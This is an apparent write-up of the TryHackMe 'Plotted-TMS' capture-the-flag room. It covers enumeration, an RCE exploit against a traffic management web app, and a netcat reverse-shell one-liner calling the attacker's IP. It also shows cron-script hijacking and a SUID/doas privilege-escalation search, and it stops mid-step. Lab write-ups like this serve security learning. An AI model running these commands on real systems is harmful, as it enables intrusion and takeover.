Let’s take a look at the [Plotted-TMS CTF](https://tryhackme.com/room/plottedtms) on TryHackMe Created by **@sa.infinity8888**.

## Enumeration
### Nmap Scan
The first step of my enumeration was a scan with **nmap**. by the command:

```
sudo nmap 10.10.123.136 -sC -sS -Pn
```
The “Nmap Output” displayed `3` service running under port 80, 445 and 22.

### Dirsearch Scan
I next decided to run a Dirsearch scan on the webserver to see if there were any interesting hidden directories, by the command:
![disearch1](/images/TMS/disearch1.JPG)

After we've completed our scan, we see
![idRSA](/images/TMS/idRSA.JPG)
And with the help of [CyberChef](https://gchq.github.io/CyberChef/) we found :

```
Trust me it is not this easy..now get back to enumeration :D
```

And we also found :
![passwd](/images/TMS/passwd.JPG)
That means:

```
not this easy :D
```

And Now I run the scan in the the webserver that is on port 445:
![Nmap](/images/TMS/disearch2.JPG)

And we found:
![landing](/images/TMS/landing.JPG)
![login](/images/TMS/login.JPG)

## Exploiting
Now let’s look for exploits that we can use.

```
searchsploit Traffic Offence Management System
```
![Searchsploit](/images/TMS/searchsploit.JPG)
The Output displayed that there's **RCE**: Remote Code Execution, **SQLi**: SQL Injection, **XSS**: Cross-site scripting. And I've decide to go with the RCE vulnerability:
![getExploit](/images/TMS/getExploit.JPG)

And I modify the Exploit to:
![modify](/images/TMS/modify.JPG)

So it successfully did a RCE and uploaded a shell on the host :
![done](/images/TMS/done.JPG)

And I tried **ls** command on it:
![testLS](/images/TMS/testLS.JPG)

### Reverse Shell
I set up my netcat listener on port 4444 and I fired up Burp and sent a POST request with the following encoded payload using URL encoding:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.174.180 4444 >/tmp/f
```
![burp](/images/TMS/burp.JPG)

**Great!** I received a reverse connection on my port 4444. And I've upgraded the shell: 
![shell](/images/TMS/shell.JPG)

### Database Discovery
Now we're in the machine and I decided to take a look at the `initialize.php` file which gave me the username and the password for accessing the database:
![initPHP](/images/TMS/initPHP.JPG)

Then I tried to connect to the database using the credentials of last file. And I found some **Password Hashs**:
![mysql1](/images/TMS/mysql1.JPG)
![mysql2](/images/TMS/mysql2.JPG)

## User Flag
Inside the home directory of the `plot_admin` user. I notice a file called `user.txt` but I didn't have the rights to access it. 
![permDenied](/images/TMS/permDenied.JPG)

As I was exploring I tried to look at the contab file:
![crontab](/images/TMS/crontab.JPG)

**Interesting** we found a script called `backup`.
![crontab](/images/TMS/backup.JPG)

Then I tried to remove the original backup script and rewrite another one that will help me get a reverse shell with [reverse-shell-generator](https://www.revshells.com/):
![backup2](/images/TMS/backup2.JPG)

And when I run `date` command I got a shell on my listner, and I got the flag:
![userFLAG](/images/TMS/userFLAG.JPG)

## Root Flag
Now it’s time to escalate our privileges and get the root flag. 
![SUDO1](/images/TMS/SUDO1.JPG)
![SUDO2](/images/TMS/SUDO2.JPG)

So as a result of `find / -perm -u=s -type f 2>/dev/null` we found that we can run ***doas*** as root. And after some research I found that I can only openssl with the root privilege and I followed the steps of [GTFObins](https://gtfobins.github.io/) :
